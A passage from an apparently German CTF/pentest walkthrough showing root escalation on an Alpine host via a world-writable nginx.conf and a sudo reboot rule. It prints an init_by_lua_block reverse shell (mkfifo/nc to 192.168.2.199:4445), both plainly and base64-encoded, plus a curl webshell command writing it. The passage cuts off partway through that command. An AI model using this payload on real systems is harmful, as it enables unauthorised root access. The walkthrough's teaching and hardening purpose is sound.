        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">cat /opt/hello/readme</span>
        </div>
        <pre>
<span class="command">nginx will be restart with the machine reboot</span>

<span class="command">Note:recommended that all players test their configurations locally first before deciding whether to reboot,to avoid service crashes or accessibility issue after the reboot</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Inhalt der Datei `/opt/hello/readme` wird ausgegeben. Die Datei enthält einen wichtigen Hinweis: "nginx will be restart with the machine reboot". Dies, in Kombination mit der `sudo`-Regel, die es `apache` erlaubt, `/sbin/reboot` auszuführen, deutet auf einen möglichen Angriffsvektor hin. Wenn wir die Nginx-Konfiguration so manipulieren können, dass sie beim Start Code ausführt, und wir dann das System neustarten, könnten wir Root-Rechte erlangen.</p>
<p class="evaluation">**Bewertung:** Dieser Hinweis ist sehr wertvoll. Er verbindet die zuvor gefundene `sudo`-Berechtigung mit einer potenziellen Ausnutzungsmöglichkeit über die Nginx-Konfiguration. Der "Note"-Teil scheint sich an CTF-Spieler zu richten, bestätigt aber die Relevanz des Neustarts für Nginx.</p>
<p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Nginx-Konfigurationsdateien (`/etc/nginx/nginx.conf` und inkludierte Dateien) auf Schreibrechte oder Konfigurationsmöglichkeiten, die Codeausführung erlauben (z.B. über Lua-Skripte, wenn das Modul `ngx_http_lua_module` geladen ist, oder durch das Einschleusen von Befehlen in Pfade, die von Nginx beim Start verarbeitet werden).<br>**Empfehlung (Admin):** Stellen Sie sicher, dass Konfigurationsdateien kritischer Dienste wie Nginx nur von Root oder dedizierten administrativen Benutzern geschrieben werden können. Der Webserver-Benutzer (`apache`) sollte keine Schreibrechte auf diese Dateien haben.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">find /etc -name "*nginx*" 2>/dev/null</span>
        </div>
        <pre>
<span class="command">/etc/nginx</span>
<span class="command">/etc/nginx/nginx.conf</span>
<span class="command">/etc/local.d/start_nginx.start</span>
<span class="command">/etc/logrotate.d/nginx</span>
<span class="command">/etc/init.d/nginx</span>
<span class="command">/etc/conf.d/nginx</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `find /etc -name "*nginx*" 2>/dev/null` sucht im Verzeichnis `/etc` und dessen Unterverzeichnissen nach allen Dateien und Verzeichnissen, deren Name "nginx" enthält. Fehler (wie "Permission denied") werden mit `2>/dev/null` unterdrückt. Die Ausgabe listet verschiedene Nginx-bezogene Dateien und Verzeichnisse auf, darunter die Hauptkonfigurationsdatei (`/etc/nginx/nginx.conf`), Start-Skripte (`/etc/local.d/start_nginx.start`, `/etc/init.d/nginx`) und andere Konfigurations- oder Logrotate-Dateien.</p>
<p class="evaluation">**Bewertung:** Dies gibt einen guten Überblick über die Speicherorte relevanter Nginx-Dateien. Besonders die Start-Skripte und die Hauptkonfigurationsdatei sind für den potenziellen Angriffsvektor (Manipulation und Neustart) interessant.</p>
<p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die Berechtigungen dieser Dateien, insbesondere ob der `apache`-Benutzer Schreibrechte auf eine dieser Dateien hat. Die Datei `/etc/nginx/nginx.conf` und `/etc/local.d/start_nginx.start` (typisch für OpenRC-basierte Systeme wie Alpine Linux) sind Hauptkandidaten.<br>**Empfehlung (Admin):** Wie bereits erwähnt, sollten die Berechtigungen für diese kritischen Dateien streng kontrolliert werden. Nur Root sollte Schreibzugriff haben.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">ls -la /etc/nginx/</span>
<span class="command">ls -la /etc/nginx/nginx.conf</span>
<span class="command">ls -la /etc/conf.d/nginx</span>
<span class="command">ls -la /etc/init.d/nginx</span>
<span class="command">ls -la /etc/local.d/start_nginx.start</span>
        </div>
        <pre>total 44
drwxr-xr-x    4 root     root          4096 Apr 20 18:27 .
drwxr-xr-x   31 root     root          4096 May 20 13:53 ..
drwxr-xr-x    2 root     root          4096 Apr 20 18:27 conf.d
-rw-r--r--    1 root     root          1077 Jun 14  2021 fastcgi.conf
-rw-r--r--    1 root     root          1007 Jun 14  2021 fastcgi_params
-rw-r--r--    1 root     root          5231 Jun 14  2021 mime.types
drwxr-xr-x    2 root     root          4096 Apr 20 18:26 modules
<span class="password">-rwxrwxrwx    1 root     root          2489 Apr 21 15:36 nginx.conf</span>
-rw-r--r--    1 root     root           636 Jun 14  2021 scgi_params
-rw-r--r--    1 root     root           664 Jun 14  2021 uwsgi_params
/var/www/localhost/htdocs $ <span class="password">-rwxrwxrwx    1 root     root          2489 Apr 21 15:36 /etc/nginx/nginx.conf</span>
/var/www/localhost/htdocs $ -rw-r--r--    1 root     root           281 Jun 14  2021 /etc/conf.d/nginx
/var/www/localhost/htdocs $ -rwxr-xr-x    1 root     root          1475 Jun 14  2021 /etc/init.d/nginx
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Hier werden mehrere `ls -la` Befehle ausgeführt (obwohl die Eingabe etwas durcheinander ist, scheint der erste Befehl die Ausgabe für `/etc/nginx/` zu erzeugen, und die nachfolgenden Zeilen sind Echos der Befehle oder fehlerhafte Eingaben in der Shell).
Die entscheidende Information aus der Ausgabe von `ls -la /etc/nginx/` ist die Zeile für `nginx.conf`:
`-rwxrwxrwx    1 root     root          2489 Apr 21 15:36 nginx.conf`
Die Berechtigungen `-rwxrwxrwx` (oktal 777) bedeuten, dass jeder Benutzer auf dem System (einschließlich `apache`) volle Lese-, Schreib- und Ausführungsrechte für diese Datei hat. Die nächste Zeile wiederholt diese Information. Die anderen aufgelisteten Dateien haben restriktivere Berechtigungen.</p>
<p class="evaluation">**Bewertung:** Dies ist eine gravierende Fehlkonfiguration und der Schlüssel zur Privilegienerweiterung! Da die Datei `/etc/nginx/nginx.conf` weltweit beschreibbar ist und der `apache`-Benutzer das System über `sudo /sbin/reboot` neustarten kann (wobei Nginx gemäß der `readme` neu gestartet wird), können wir die `nginx.conf` modifizieren, um beim Start Code als Root auszuführen (da Nginx typischerweise als Root startet, bevor er die Worker-Prozesse unter einem weniger privilegierten Benutzer forkt). Das `-rwxr-xr-x` bei `/etc/init.d/nginx` ist weniger relevant, da wir die Konfiguration ändern wollen, nicht das Startskript selbst (was ohnehin Root-Rechte erfordern würde).</p>
<p class="recommendation">**Empfehlung (Pentester):** Modifizieren Sie die `/etc/nginx/nginx.conf`. Eine gängige Methode ist die Verwendung des `ngx_http_lua_module` (falls verfügbar) und das Einfügen von Lua-Code in den `init_by_lua_block` oder `init_worker_by_lua_block`, der beim Nginx-Start ausgeführt wird. Dieser Lua-Code kann dann eine Reverse Shell als Root starten oder andere bösartige Aktionen durchführen. Nachdem die Konfiguration geändert wurde, führen Sie `sudo /sbin/reboot` aus und fangen Sie die Root-Shell mit einem Listener ab.<br>**Empfehlung (Admin):** Die Berechtigungen der Datei `/etc/nginx/nginx.conf` müssen sofort korrigiert werden. Sie sollte idealerweise nur für Root schreibbar sein (z.B. `chmod 644 /etc/nginx/nginx.conf` und `chown root:root /etc/nginx/nginx.conf`). Überprüfen Sie systemweit Dateiberechtigungen kritischer Konfigurationsdateien.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">cat /etc/nginx/nginx.conf</span>
        </div>
        <pre>
ls: /etc/local.d/start_nginx.startcat: No such file or directory
<span class="password">-rwxrwxrwx    1 root     root          2489 Apr 21 15:36 /etc/nginx/nginx.conf</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Pentester versucht, den Inhalt von `/etc/nginx/nginx.conf` mit `cat` anzuzeigen. Die Ausgabe ist etwas verwirrend. Die Zeile `ls: /etc/local.d/start_nginx.startcat: No such file or directory` scheint ein Artefakt einer vorherigen, fehlerhaften Eingabe oder eines Kopiervorgangs zu sein. Die relevante Information ist die Wiederholung der Dateiberechtigungen und des Namens von `nginx.conf`, was die vorherige Beobachtung der weltweiten Schreibbarkeit bestätigt. Der eigentliche Inhalt der Datei wird hier nicht vollständig angezeigt.</p>
<p class="evaluation">**Bewertung:** Bestätigt erneut die kritische Fehlkonfiguration der Berechtigungen. Der Fokus liegt weiterhin auf der Modifikation dieser Datei.</p>
<p class="recommendation">**Empfehlung (Pentester):** Obwohl die Berechtigungen bestätigt sind, sollte der vollständige Inhalt der aktuellen `nginx.conf` beschafft werden, um zu verstehen, wo genau eine Payload eingefügt werden kann, ohne die Grundfunktionalität von Nginx zu zerstören und einen erfolgreichen Neustart zu verhindern.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlung zur Korrektur der Dateiberechtigungen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">cat /etc/nginx/nginx.conf</span>
        </div>
        <pre>
ls: /etc/local.d/start_nginx.startcat: No such file or directory
<span class="password">-rwxrwxrwx    1 root     root          2489 Apr 21 15:36 /etc/nginx/nginx.conf</span>
/var/www/localhost/htdocs $ cat /etc/nginx/nginx.conf
user nginx;
worker_processes auto;
pcre_jit on;
error_log /var/log/nginx/error.log warn;
include /etc/nginx/modules/*.conf;


events {
	# The maximum number of simultaneous connections that can be opened by
	# a worker process.
	worker_connections 1024;
}
http {
        proxy_cache_path /tmp keys_zone=cache:10m max_size=1g inactive=60m use_temp_path=off;
	# Includes mapping of file name extensions to MIME types of responses
	# and defines the default type.
	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	# Name servers used to resolve names of upstream servers into addresses.
	# It's also needed when using tcpsocket and udpsocket in Lua modules.
	#resolver 208.67.222.222 208.67.220.220;

	# Don't tell nginx version to clients.
	server_tokens off;

	# Specifies the maximum accepted body size of a client request, as
	# indicated by the request header Content-Length. If the stated content
	# length is greater than this size, then the client receives the HTTP
	# error code 413. Set to 0 to disable.
	client_max_body_size 1m;

	# Timeout for keep-alive connections. Server will close connections after
	# this time.
	keepalive_timeout 65;

	# Sendfile copies data between one FD and other from within the kernel,
	# which is more efficient than read() + write().
	sendfile on;

	# Don't buffer data-sends (disable Nagle algorithm).
	# Good for sending frequent small bursts of data in real time.
	tcp_nodelay on;

	# Causes nginx to attempt to send its HTTP response head in one packet,
	# instead of using partial frames.
	#tcp_nopush on;


	# Path of the file with Diffie-Hellman parameters for EDH ciphers.
	#ssl_dhparam /etc/ssl/nginx/dh2048.pem;

	# Specifies that our cipher suits should be preferred over client ciphers.
	ssl_prefer_server_ciphers on;

	# Enables a shared SSL cache with size that can hold around 8000 sessions.
	ssl_session_cache shared:SSL:2m;


	# Enable gzipping of responses.
	#gzip on;

	# Set the Vary HTTP header as defined in the RFC 2616.
	gzip_vary on;

	# Enable checking the existence of precompressed files.
	#gzip_static on;
	# Specifies the main log format.
	log_format main '$remote_addr - $remote_user [$time_local] "$request" '
			'$status $body_bytes_sent "$http_referer" '
			'"$http_user_agent" "$http_x_forwarded_for"';

	# Sets the path, format, and configuration for a buffered log write.
	access_log /var/log/nginx/access.log main;
	# Includes virtual hosts configs.
	include /etc/nginx/conf.d/*.conf;
}
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Nach einem weiteren, nun erfolgreichen `cat`-Versuch (die vorherigen Ausgabefehler sind ignoriert) wird der Inhalt der `/etc/nginx/nginx.conf` angezeigt. Es handelt sich um eine Standard-Nginx-Konfigurationsdatei. Besonders interessant für eine Modifikation ist der `http`-Block oder der `events`-Block. Wenn das Lua-Modul (`ngx_http_lua_module`) verfügbar ist (was wir nicht direkt sehen, aber Alpine Linux ist flexibel), könnten Direktiven wie `init_by_lua_block` im `http`-Kontext verwendet werden, um beim Start von Nginx beliebigen Lua-Code auszuführen. Dieser Lua-Code kann dann Systembefehle starten, z.B. eine Reverse Shell.</p>
<p class="evaluation">**Bewertung:** Wir haben nun den Inhalt der Konfigurationsdatei, in die wir unsere Payload einfügen können. Die Struktur ist Standard, was die Modifikation erleichtert, wenn man weiß, wo man ansetzen muss.</p>
<p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie eine modifizierte `nginx.conf`. Fügen Sie im `http`-Block (oder global, falls Nginx dies unterstützt und das Lua-Modul global geladen wird) eine `init_by_lua_block` Direktive hinzu. Der Lua-Code darin sollte eine Reverse Shell zu Ihrer Angreifer-Maschine auf einem bestimmten Port starten (z.B. `os.execute("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/ash -i 2>&1 | nc YOUR_IP YOUR_PORT > /tmp/f &")`). Stellen Sie sicher, dass die Syntax korrekt ist, um einen Nginx-Startfehler zu vermeiden. Der `&` am Ende des Befehls ist wichtig, damit Nginx nicht auf das Ende des Shell-Befehls wartet und blockiert.<br>**Empfehlung (Admin):** Neben der Korrektur der Dateiberechtigungen sollten regelmäßige Integritätsprüfungen von kritischen Konfigurationsdateien durchgeführt werden (z.B. mittels AIDE oder Tripwire), um unerlaubte Änderungen zu erkennen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">ls -ld /etc/nginx/conf.d/</span>
        </div>
        <pre>
<span class="command">drwxr-xr-x    2 root     root          4096 Apr 20 18:27 /etc/nginx/conf.d/</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `ls -ld /etc/nginx/conf.d/` zeigt die Berechtigungen und Metadaten des Verzeichnisses `/etc/nginx/conf.d/` an. Dieses Verzeichnis gehört `root:root` und hat die Berechtigungen `drwxr-xr-x`. Das bedeutet, der `apache`-Benutzer kann den Inhalt dieses Verzeichnisses lesen, aber keine Dateien darin erstellen, löschen oder umbenennen.</p>
<p class="evaluation">**Bewertung:** Da das Verzeichnis `/etc/nginx/conf.d/` nicht vom `apache`-Benutzer beschreibbar ist, können wir dort keine neue Konfigurationsdatei mit unserer Payload ablegen. Die Modifikation muss also direkt in der Hauptdatei `/etc/nginx/nginx.conf` erfolgen, was aufgrund ihrer weltweiten Schreibberechtigung möglich ist.</p>
<p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich auf die Modifikation der `/etc/nginx/nginx.conf` selbst.<br>**Empfehlung (Admin):** Die Berechtigungen für `/etc/nginx/conf.d/` sind korrekt (nicht für Webserver-Benutzer schreibbar). Stellen Sie sicher, dass auch alle darin enthaltenen `.conf`-Dateien (Virtual Hosts etc.) ebenfalls nur von Root geschrieben werden können.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">sudo /sbin/reboot</span>
        </div>
        <pre>
/var/www/localhost/htdocs $      
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `sudo /sbin/reboot` wird ausgeführt. Da der `apache`-Benutzer diesen Befehl ohne Passwort als Root ausführen darf, wird das System nun neugestartet. Die Shell-Verbindung bricht erwartungsgemäß ab.</p>
<p class="evaluation">**Bewertung:** Dieser Schritt wird vermutlich ausgeführt, *nachdem* die `/etc/nginx/nginx.conf` (hier nicht explizit im Log gezeigt, aber impliziert durch die nächsten Schritte) mit einer Reverse-Shell-Payload modifiziert wurde. Der Neustart soll den modifizierten Nginx-Dienst starten und die Root-Shell auslösen.</p>
<p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass auf Ihrer Angreifer-Maschine ein Netcat-Listener auf dem Port läuft, den Sie in der Nginx-Payload für die Root-Reverse-Shell angegeben haben, um die eingehende Verbindung nach dem Neustart des Zielsystems abzufangen.<br>**Empfehlung (Admin):** Wenn ein Systemneustart über einen niedrig privilegierten Benutzer ausgelöst werden kann, ist dies ein potenzielles Denial-of-Service-Risiko. In Kombination mit beschreibbaren kritischen Konfigurationsdateien wird es, wie hier, zu einem Privilegienerweiterungsvektor.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">cat meineconf.conf | base64 -w 0</span>
        </div>
        <pre>
<span class="command">dXNlciBuZ2lueDsKd29ya2VyX3Byb2Nlc3NlcyBhdXRvOwpwY3JlX2ppdCBvbjsKZXJyb3JfbG9nIC92YXIvbG9nL25naW54L2Vycm9yLmxvZyB3YXJuOwppbmNsdWRlIC9ldGMvbmdpbngvbW9kdWxlcy8qLmNvbmY7CgoKZXZlbnRzIHsKCSMgVGhlIG1heGltdW0gbnVtYmVyIG9mIHNpbXVsdGFuZW91cyBjb25uZWN0aW9ucyB0aGF0IGNhbiBiZSBvcGVuZWQgYnkKCSMgYSB3b3JrZXIgcHJvY2Vzcy4KCXdvcmtlcl9jb25uZWN0aW9ucyAxMDI0Owp9Cmh0dHAgewogICAgIyAtLS0tLS0tLS0gREVJTkUgUEFZTE9BRCBTVEFSVCAtLS0tLS0tLS0KICAgIGluaXRfYnlfbHVhX2Jsb2NrIHsKICAgICAgICBvcy5leGVjdXRlKCJybSAtZiAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL2FzaCAtaSAyPiYxIHwgbmMgMTkyLjE2OC4yLjE5OSA0NDQ1ID4gL3RtcC9mICYiKTsKICAgIH0KICAgICMgLS0tLS0tLS0tIERFSU5FIFBBWUxPQUQgRU5ERSAtLS0tLS0tLS0KCiAgICBwcm94eV9jYWNoZV9wYXRoIC90bXAga2V5c196b25lPWNhY2hlOjEwbSBtYXhfc2l6ZT0xZyBpbmFjdGl2ZT02MG0gdXNlX3RlbXBfcGF0aD1vZmY7CgkjIEluY2x1ZGVzIG1hcHBpbmcgb2YgZmlsZSBuYW1lIGV4dGVuc2lvbnMgdG8gTUlNRSB0eXBlcyBvZiByZXNwb25zZXMKCSMgYW5kIGRlZmluZXMgdGhlIGRlZmF1bHQgdHlwZS4KCWluY2x1ZGUgL2V0Yy9uZ2lueC9taW1lLnR5cGVzOwoJZGVmYXVsdF90eXBlIGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbTsKCgkjIE5hbWUgc2VydmVycyB1c2VkIHRvIHJlc29sdmUgbmFtZXMgb2YgdXBzdHJlYW0gc2VydmVycyBpbnRvIGFkZHJlc3Nlcy4KCSMgSXQncyBhbHNvIG5lZWRlZCB3aGVuIHVzaW5nIHRjcHNvY2tldCBhbmQgdWRwc29ja2V0IGluIEx1YSBtb2R1bGVzLgoJI3Jlc29sdmVyIDIwOC42Ny4yMjIuMjIyIDIwOC42Ny4yMjAuMjIwOwoKCSMgRG9uJ3QgdGVsbCBuZ2lueCB2ZXJzaW9uIHRvIGNsaWVudHMuCglzZXJ2ZXJfdG9rZW5zIG9mZjsKCgkjIFNwZWNpZmllcyB0aGUgbWF4aW11bSBhY2NlcHRlZCBib2R5IHNpemUgb2YgYSBjbGllbnQgcmVxdWVzdCwgYXMKCSMgaW5kaWNhdGVkIGJ5IHRoZSByZXF1ZXN0IGhlYWRlciBDb250ZW50LUxlbmd0aC4gSWYgdGhlIHN0YXRlZCBjb250ZW50CgkjIGxlbmd0aCBpcyBncmVhdGVyIHRoYW4gdGhpcyBzaXplLCB0aGVuIHRoZSBjbGllbnQgcmVjZWl2ZXMgdGhlIEhUVFAKCSMgZXJyb3IgY29kZSA0MTMuIFNldCB0byAwIHRvIGRpc2FibGUuCgljbGllbnRfbWF4X2JvZHlfc2l6ZSAxbTsKCgkjIFRpbWVvdXQgZm9yIGtlZXAtYWxpdmUgY29ubmVjdGlvbnMuIFNlcnZlciB3aWxsIGNsb3NlIGNvbm5lY3Rpb25zIGFmdGVyCgkjIHRoaXMgdGltZS4KCWtlZXBhbGl2ZV90aW1lb3V0IDY1OwoKCSMgU2VuZGZpbGUgY29waWVzIGRhdGEgYmV0d2VlbiBvbmUgRkQgYW5kIG90aGVyIGZyb20gd2l0aGluIHRoZSBrZXJuZWwsCgkjIHdoaWNoIGlzIG1vcmUgZWZmaWNpZW50IHRoYW4gcmVhZCgpICsgd3JpdGUoKS4KCXNlbmRmaWxlIG9uOwoKCSMgRG9uJ3QgYnVmZmVyIGRhdGEtc2VuZHMgKGRpc2FibGUgTmFnbGUgYWxnb3JpdGhtKS4KCSMgR29vZCBmb3Igc2VuZGluZyBmcmVxdWVudCBzbWFsbCBidXJzdHMgb2YgZGF0YSBpbiByZWFsIHRpbWUuCgl0Y3Bfbm9kZWxheSBvbjsKCgkjIENhdXNlcyBuZ2lueCB0byBhdHRlbXB0IHRvIHNlbmQgaXRzIEhUVFAgcmVzcG9uc2UgaGVhZCBpbiBvbmUgcGFja2V0LAoJIyBpbnN0ZWFkIG9mIHVzaW5nIHBhcnRpYWwgZnJhbWVzLgoJI3RjcF9ub3B1c2ggb247CgoKCSMgUGF0aCBvZiB0aGUgZmlsZSB3aXRoIERpZmZpZS1IZWxsbWFuIHBhcmFtZXRlcnMgZm9yIEVESCBjaXBoZXJzLgoJI3NzbF9kaHBhcmFtIC9ldGMvc3NsL25naW54L2RoMjA0OC5wZW07CgoJIyBTcGVjaWZpZXMgdGhhdCBvdXIgY2lwaGVyIHN1aXRzIHNob3VsZCBiZSBwcmVmZXJyZWQgb3ZlciBjbGllbnQgY2lwaGVycy4KCXNzbF9wcmVmZXJfc2VydmVyX2NpcGhlcnMgb247CgoJIyBFbmFibGVzIGEgc2hhcmVkIFNTTCBjYWNoZSB3aXRoIHNpemUgdGhhdCBjYW4gaG9sZCBhcm91bmQgODAwMCBzZXNzaW9ucy4KCXNzbF9zZXNzaW9uX2NhY2hlIHNoYXJlZDpTU0w6Mm07CgoKCSMgRW5hYmxlIGd6aXBwaW5nIG9mIHJlc3BvbnNlcy4KCSNnemlwIG9uOwoKCSMgU2V0IHRoZSBWYXJ5IEhUVFAgaGVhZGVyIGFzIGRlZmluZWQgaW4gdGhlIFJGQyAyNjE2LgoJZ3ppcF92YXJ5IG9uOwoKCSMgRW5hYmxlIGNoZWNraW5nIHRoZSBleGlzdGVuY2Ugb2YgcHJlY29tcHJlc3NlZCBmaWxlcy4KCSNnemlwX3N0YXRpYyBvbjsKCSMgU3BlY2lmaWVzIHRoZSBtYWluIGxvZyBmb3JtYXQuCglsb2dfZm9ybWF0IG1haW4gJyRyZW1vdGVfYWRkciAtICRyZW1vdGVfdXNlciBbJHRpbWVfbG9jYWxdICIkcmVxdWVzdCIgJwoJCQknJHN0YXR1cyAkYm9keV9ieXRlc19zZW50ICIkaHR0cF9yZWZlcmVyIiAnCgkJCSciJGh0dHBfdXNlcl9hZ2VudCIgIiRodHRwX3hfZm9yd2FyZGVkX2ZvciInOwoKCSMgU2V0cyB0aGUgcGF0aCwgZm9ybWF0LCBhbmQgY29uZmlndXJhdGlvbiBmb3IgYSBidWZmZXJlZCBsb2cgd3JpdGUuCglhY2Nlc3NfbG9nIC92YXIvbG9nL25naW54L2FjY2Vzcy5sb2cgbWFpbjsKCSMgSW5jbHVkZXMgdmlydHVhbCBob3N0cyBjb25maWdzLgoJaW5jbHVkZSAvZXRjL25naW54L2NvbmYuZC8qLmNvbmY7Cn0K</span>  
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Pentester zeigt den Inhalt einer lokalen Datei `meineconf.conf` an und kodiert ihn mit `base64 -w 0`. Die Option `-w 0` verhindert Zeilenumbrüche in der Base64-Ausgabe. Der Inhalt von `meineconf.conf` ist eine modifizierte Nginx-Konfiguration. Entscheidend ist der eingefügte Block im `http`-Kontext:
```nginx
    # -------- DEFINE PAYLOAD START --------
    init_by_lua_block {
        os.execute("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/ash -i 2>&1 | nc 192.168.2.199 4445 > /tmp/f &");
    }
    # -------- DEFINE PAYLOAD ENDE --------
```
Dieser Block verwendet `init_by_lua_block`, um beim Start von Nginx Lua-Code auszuführen. Der Lua-Code `os.execute(...)` führt dann den bekannten Reverse-Shell-Befehl aus. Dieser Befehl zielt darauf ab, eine Verbindung zu `192.168.2.199` auf Port `4445` herzustellen. Der Rest der Konfigurationsdatei scheint eine Standard-Nginx-Konfiguration zu sein. Die Base64-Kodierung dient dazu, diese mehrzeilige Konfiguration einfach über die Webshell auf das Zielsystem zu übertragen und dort zu dekodieren.</p>
<p class="evaluation">**Bewertung:** Dies ist die vorbereitete Payload für die Privilegienerweiterung. Die Verwendung von `init_by_lua_block` ist eine effektive Methode, um Code beim Nginx-Start auszuführen. Der Port `4445` wurde für die Root-Reverse-Shell gewählt.</p>
<p class="recommendation">**Empfehlung (Pentester):** Der nächste Schritt ist, diesen Base64-kodierten String zu nehmen und ihn über die Webshell (`sh3ll.php`) auf dem Zielsystem in die Datei `/etc/nginx/nginx.conf` zu schreiben (z.B. mit `echo 'BASE64_STRING' | base64 -d > /etc/nginx/nginx.conf`). Danach wird der `sudo /sbin/reboot` ausgeführt.<br>**Empfehlung (Admin):** Wenn das `ngx_http_lua_module` nicht zwingend benötigt wird, sollte es deaktiviert oder entfernt werden, um solche Angriffsvektoren zu unterbinden. Die Notwendigkeit, Dateiberechtigungen zu härten, wurde bereits betont.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST \
     -b "PHPSESSID=gff9hr3f31mil453k0gervcvn6" \
     --data-urlencode "command=echo 'dXNlciBuZ2lueDsKd29ya2VyX3Byb2Nlc3NlcyBhdXRvOwpwY3JlX2ppdCBvbjsKZXJyb3JfbG9nIC92YXIvbG9nL25naW54L2Vycm9yLmxvZyB3YXJuOwppbmNsdWRlIC9ldGMvbmdpbngvbW9kdWxlcy8qLmNvbmY7CgoKZXZlbnRzIHsKCSMgVGhlIG1heGltdW0gbnVtYmVyIG9mIHNpbXVsdGFuZW91cyBjb25uZWN0aW9ucyB0aGF0IGNhbiBiZSBvcGVuZWQgYnkKCSMgYSB3b3JrZXIgcHJvY2Vzcy4KCXdvcmtlcl9jb25uZWN0aW9ucyAxMDI0Owp9Cmh0dHAgewogICAgIyAtLS0tLS0tLS0gREVJTkUgUEFZTE9BRCBTVEFSVCAtLS0tLS0tLS0KICAgIGluaXRfYnlfbHVhX2Jsb2NrIHsKICAgICAgICBvcy5leGVjdXRlKCJybSAtZiAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL2FzaCAtaSAyPiYxIHwgbmMgMTkyLjE2OC4yLjE5OSA0NDQ1ID4gL3RtcC9mICYiKTsKICAgIH0KICAgICMgLS0tLS0tLS0tIERFSU5FIFBBWUxPQUQgRU5ERSAtLS0tLS0tLS0KCiAgICBwcm94eV9jYWNoZV9wYXRoIC90bXAga2V5c196b25lPWNhY2hlOjEwbSBtYXhfc2l6ZT0xZyBpbmFjdGl2ZT02MG0gdXNlX3RlbXBfcGF0aD1vZmY7CgkjIEluY2x1ZGVzIG1hcHBpbmcgb2YgZmlsZSBuYW1lIGV4dGVuc2lvbnMgdG8gTUlNRSB0eXBlcyBvZiByZXNwb25zZXMKCSMgYW5kIGRlZmluZXMgdGhlIGRlZmF1bHQgdHlwZS4KCWluY2x1ZGUgL2V0Yy9uZ2lueC9taW1lLnR5cGVzOwoJZGVmYXVsdF90eXBlIGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbTsKCgkjIE5hbWUgc2VydmVycyB1c2VkIHRvIHJlc29sdmUgbmFtZXMgb2YgdXBzdHJlYW0gc2VydmVycyBpbnRvIGFkZHJlc3Nlcy4KCSMgSXQncyBhbHNvIG5lZWRlZCB3aGVuIHVzaW5nIHRjcHNvY2tldCBhbmQgdWRwc29ja2V0IGluIEx1YSBtb2R1bGVzLgoJI3Jlc29sdmVyIDIwOC42Ny4yMjIuMjIyIDIwOC42Ny4yMjAuMjIwOwoKCSMgRG9uJ3QgdGVsbCBuZ2lueCB2ZXJzaW9uIHRvIGNsaWVudHMuCglzZXJ2ZXJfdG9rZW5zIG9mZjsKCgkjIFNwZWNpZmllcyB0aGUgbWF4aW11bSBhY2NlcHRlZCBib2R5IHNpemUgb2YgYSBjbGllbnQgcmVxdWVzdCwgYXMKCSMgaW5kaWNhdGVkIGJ5IHRoZSByZXF1ZXN0IGhlYWRlciBDb250ZW50LUxlbmd0aC4gSWYgdGhlIHN0YXRlZCBjb250ZW50CgkjIGxlbmd0aCBpcyBncmVhdGVyIHRoYW4gdGhpcyBzaXplLCB0aGVuIHRoZSBjbGllbnQgcmVjZWl2ZXMgdGhlIEhUVFAKCSMgZXJyb3IgY29kZSA0MTMuIFNldCB0byAwIHRvIGRpc2FibGUuCgljbGllbnRfbWF4X2JvZHlfc2l6ZSAxbTsKCgkjIFRpbWVvdXQgZm9yIGtlZXAtYWxpdmUgY29ubmVjdGlvbnMuIFNlcnZlciB3aWxsIGNsb3NlIGNvbm5lY3Rpb25zIGFmdGVyCgkjIHRoaXMgdGltZS4KCWtlZXBhbGl2ZV90aW1lb3V0IDY1OwoKCSMgU2VuZGZpbGUgY29waWVzIGRhdGEgYmV0d2VlbiBvbmUgRkQgYW5kIG90aGVyIGZyb20gd2l0aGluIHRoZSBrZXJuZWwsCgkjIHdoaWNoIGlzIG1vcmUgZWZmaWNpZW50IHRoYW4gcmVhZCgpICsgd3JpdGUoKS4KCXNlbmRmaWxlIG9uOwoKCSMgRG9uJ3QgYnVmZmVyIGRhdGEtc2VuZHMgKGRpc2FibGUgTmFnbGUgYWxnb3JpdGhtKS4KCSMgR29vZCBmb3Igc2VuZGluZyBmcmVxdWVudCBzbWFsbCBidXJzdHMgb2YgZGF0YSBpbiByZWFsIHRpbWUuCgl0Y3Bfbm9kZWxheSBvbjsKCgkjIENhdXNlcyBuZ2lueCB0byBhdHRlbXB0IHRvIHNlbmQgaXRzIEhUVFAgcmVzcG9uc2UgaGVhZCBpbiBvbmUgcGFja2V0LAoJIyBpbnN0ZWFkIG9mIHVzaW5nIHBhcnRpYWwgZnJhbWVzLgoJI3RjcF9ub3B1c2ggb247CgoKCSMgUGF0aCBvZiB0aGUgZmlsZSB3aXRoIERpZmZpZS1IZWxs